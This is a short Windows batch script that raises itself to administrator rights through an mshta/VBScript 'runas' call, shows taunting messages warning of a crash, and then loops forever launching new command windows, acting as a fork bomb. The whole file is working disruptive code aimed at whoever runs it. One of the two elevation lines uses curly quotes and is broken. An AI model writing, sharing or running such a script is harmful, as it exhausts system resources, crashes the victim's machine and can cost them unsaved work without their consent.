@echo off
%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit cd /d "%~dp0"
%1 mshta vbscript:CreateObject(“Shell.Application”).ShellExecute(“cmd.exe”,"/c %~s0 ::","",“runas”,1)(window.close)&&exit
echo hello! MY brother!
pause
echo I wish you no good fruit this year!
pause
echo haha! I am happy to say that!
pause
echo bye!
pause
echo I forgot to tell you
echo Turn them off or wait for the crash
echo bye again!
pause
:start
start cmd
goto start
